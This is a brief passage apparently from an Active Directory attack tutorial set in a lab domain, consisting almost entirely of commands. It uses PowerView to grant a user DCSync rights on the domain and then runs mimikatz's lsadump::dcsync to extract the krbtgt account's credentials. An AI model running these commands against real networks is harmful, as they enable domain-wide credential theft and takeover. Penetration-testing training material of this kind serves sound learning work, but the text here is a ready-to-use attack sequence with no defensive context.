#### Modifying DACLs using PowerView
```powershell
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity $(Get-DomainSID) -PrincipalIdentity luna -Rights DCSync -Verbose
```
To perform `DCSync` from Windows, we can use [mimikatz](https://github.com/gentilkiwi/mimikatz):
```cmd
mimikatz.exe "lsadump::dcsync /domain:inlanefreight.local /user:krbtgt /csv"
```
